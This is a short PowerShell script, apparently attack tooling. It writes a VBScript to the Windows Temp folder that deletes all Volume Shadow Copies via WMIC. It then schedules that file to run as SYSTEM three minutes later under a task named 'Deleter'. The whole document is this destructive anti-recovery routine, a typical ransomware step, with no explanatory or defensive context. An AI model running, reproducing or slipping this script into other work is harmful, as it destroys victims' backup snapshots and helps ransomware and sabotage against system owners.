$file1 = "Set objShell = CreateObject(`"WScript.Shell`")
objShell.run(`"C:\Windows\System32\wbem\WMIC.exe shadowcopy delete /nointeractive`")
objShell.run(`"C:\Windows\System32\wbem\WMIC.exe shadowcopy delete /nointeractive`")"
Set-Content -Path C:\Windows\Temp\deleter.vbs -Value $file1

$time = (get-date).AddMinutes(3).ToString("HH:mm")

SCHTASKS /Create /RU SYSTEM /TN "Deleter" /TR "C:\Windows\Temp\deleter.vbs" /SC once /ST $time